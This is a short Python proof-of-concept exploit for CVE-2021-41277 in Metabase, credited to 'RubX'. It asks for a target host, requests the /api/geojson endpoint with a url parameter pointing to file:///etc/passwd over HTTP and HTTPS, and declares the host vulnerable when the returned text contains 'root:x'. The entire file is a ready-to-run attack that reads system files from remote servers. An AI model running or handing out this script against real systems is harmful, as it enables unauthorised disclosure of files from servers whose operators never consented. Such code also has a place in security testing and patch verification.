#!/usr/bin/python3
#POC by RubX
#METABASE CVE-2021â€“41277 
#You will have to install colorama > pip3 install colorama

import requests
import colorama

colorama.init()

url = input("Enter the target IP or domain name: ")

http_endpoint = f"http://{url}/api/geojson?url=file:///etc/passwd"
https_endpoint = f"https://{url}/api/geojson?url=file:///etc/passwd"

vulnerable = False

try:
    response = requests.get(http_endpoint)
    if "root:x" in response.text:
        print(colorama.Fore.GREEN + f"The target system at {url} is likely vulnerable to CVE-2021-41277 at endpoint: {http_endpoint}")
        vulnerable = True
except:
    pass

try:
    response = requests.get(https_endpoint)
    if "root:x" in response.text:
        print(colorama.Fore.GREEN + f"The target system at {url} is likely vulnerable to CVE-2021-41277 at endpoint: {https_endpoint}")
        vulnerable = True
except:
    pass

if not vulnerable:
    print(colorama.Fore.RED + f"The target system at {url} seems to not be vulnerable to CVE-2021-41277")
